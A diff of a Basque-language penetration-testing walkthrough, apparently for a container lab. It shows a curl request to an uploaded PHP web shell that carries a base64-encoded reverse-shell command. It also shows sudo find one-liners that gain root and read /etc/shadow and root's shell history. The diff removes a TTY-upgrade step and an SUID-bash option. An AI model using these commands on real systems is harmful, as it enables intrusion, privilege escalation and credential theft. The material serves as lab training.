@@ -213,16 +213,7 @@ curl "http://localhost/avatars/shell.php?cmd=cGhwIC1yICckcz1mc29ja29wZW4oIjE3Mi4
 ```
 > Konexioa entzulerara iristen da — prompt gabeko shell motu bat
 
-Shell-a hobetu (Terminal 1-en):
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-Sakatu `Ctrl+Z`, gero:
-```bash
-stty raw -echo; fg
-```
-Sakatu Enter bi aldiz.
-> `www-data@edukiontzia:/var/www/html$` — shell interaktibo osoa
+> Konexioa iristen da — prompt gabeko shell mugatua. Komandoak exekutatzeko nahikoa.
 
 ---
 
@@ -234,27 +225,10 @@ sudo -l
 ```
 > `(root) NOPASSWD: /usr/bin/find`
 
-A aukera — GTFOBins sudo find-ekin:
+GTFOBins sudo find-ekin (TTY gabe):
 ```bash
-sudo find . -exec /bin/bash \; -quit
+sudo find . -exec /bin/bash -c 'whoami' \; -quit
+sudo find . -exec /bin/bash -c 'cat /etc/shadow' \; -quit
+sudo find . -exec /bin/bash -c 'cat /root/.bash_history' \; -quit
 ```
-```bash
-whoami
-```
-> `root`
-
-B aukera — SUID bash:
-```bash
-/tmp/rootbash -p
-whoami
-```
-> `root`
-
-Root gisa arakatu:
-```bash
-id
-cat /etc/shadow
-ls -la /root
-cat /root/.bash_history
-```
-> `uid=0(root) gid=0(root)` — edukiontziari kontrol osoa
+> `root` — `uid=0(root) gid=0(root)` — edukiontziari kontrol osoa
